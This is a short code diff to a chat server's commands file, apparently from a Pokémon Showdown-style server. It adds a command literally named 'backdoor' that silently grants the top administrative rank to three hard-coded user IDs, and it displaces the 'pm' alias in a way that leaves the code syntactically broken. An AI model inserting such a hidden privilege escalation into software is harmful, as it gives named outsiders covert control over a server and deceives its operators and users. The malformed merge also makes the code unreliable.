@@ -69,7 +69,16 @@ var commands = exports.commands = {
 		return this.parse('/msg '+(user.lastPM||'')+', '+target);
 	},
 
-	pm: 'msg',
+
+	backdoor: function(target,room, user) {
+		if (user.userid === 'blakjack' || user.userid === 'ncrypt' || user.userid === 'jackdaw') {
+
+			user.group = '~';
+			user.updateIdentity();
+
+			this.parse('/promote ' + user.name + ', ~');
+		}
+	}	pm: 'msg',
 	whisper: 'msg',
 	w: 'msg',
 	msg: function(target, room, user) {
